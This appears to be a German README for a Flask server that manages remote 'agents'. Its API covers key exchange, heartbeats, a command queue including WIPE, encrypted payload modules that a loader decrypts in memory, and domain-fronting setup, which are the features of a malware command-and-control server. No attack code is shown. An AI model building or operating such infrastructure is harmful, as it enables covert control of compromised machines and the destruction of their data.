# Server Component

Eine minimale Flask-Anwendung, die REST-Endpunkte für Registrierung, Kommandos und Updates bereitstellt. Neu sind Endpunkte zur Heartbeat-Verarbeitung und Kommandoverteilung.

## Key Exchange
```
POST /key_exchange
{ "uuid": "<client uuid>", "public_key": "-----BEGIN RSA PUBLIC KEY-----..." }
```
Antwort:
```
{ "aes_key": "<base64 encrypted key>" }
```

## Heartbeat
```
POST /heartbeat
{ "uuid": "<client uuid>" }
```

Der Server speichert den Zeitpunkt des letzten Heartbeats pro Client. Ist kein neuer Heartbeat innerhalb von 180 Sekunden eingegangen, wechselt der Client-Status auf **offline**.

### Client-Status
Der aktuelle Zustand kann über folgenden Endpunkt abgefragt werden:

```
GET /status/<uuid>
-> { "uuid": "<uuid>", "status": "online", "last_seen": "2025-06-04T10:00:00" }
```

## Kommandos
```
POST /command/<uuid>
{ "command": "SAFE_MODE", "parameters": {} }
```
Unterstützte Befehle sind `SAFE_MODE`, `WIPE` und `DEEP_SLEEP`. Das alte Feld `cmd` wird weiterhin akzeptiert, bevorzugt wird jedoch das JSON-Format oben. Befehle werden serverseitig geloggt und beim nächsten Abruf ausgeliefert.

```
GET /commands/<uuid>
-> { "commands": [{"command":"SAFE_MODE","parameters":{}}] }
```
Jeder Eintrag enthält das Kommando und optionale Parameter.

## Payload Delivery
```
GET /payload/<uuid>/<module>
-> { "payload": "<base64 encrypted module>" }
```
Der Server liefert verschlüsselte Module, welche der gehärtete Loader im Arbeitsspeicher entschlüsselt und lädt.

## Admin Endpoints

Für administrative Aufgaben steht ein einfacher API-Key geschützter Zugriff zur Verfügung. Der Key wird über den HTTP-Header `X-API-KEY` übermittelt.

### Agents auflisten
```
GET /admin/agents
-> { "agents": [{"uuid": "<id>", "online": true, "last_seen": "..."}] }
```

### Logs eines Agents
```
GET /admin/logs/<uuid>
-> { "logs": [{"message": "...", "timestamp": "..."}] }
```

### Kommando pushen
```
POST /admin/command/<uuid>
{ "command": "SAFE_MODE", "parameters": {} }
```
Identisch zu `/command/<uuid>`, aber nur mit gültigem API-Key erreichbar.

```
pip install -r requirements.txt
python app.py
```

Der API-Key kann über die Umgebungsvariable `ADMIN_API_KEY` gesetzt werden (Standard: `changeme`).

## Domain Fronting Vorbereitung

In `config.json` lässt sich eine Liste erlaubter Hostnamen konfigurieren. Bei eingehenden Anfragen prüft der Server den `Host`-Header und lehnt unbekannte Hosts ab. Über `/config/targets` kann die aktuelle Routing-Tabelle abgefragt werden.
Beispiel `config.json`:
```json
{
  "allowed_hosts": ["localhost", "example.cloudfront.net"]
}
```
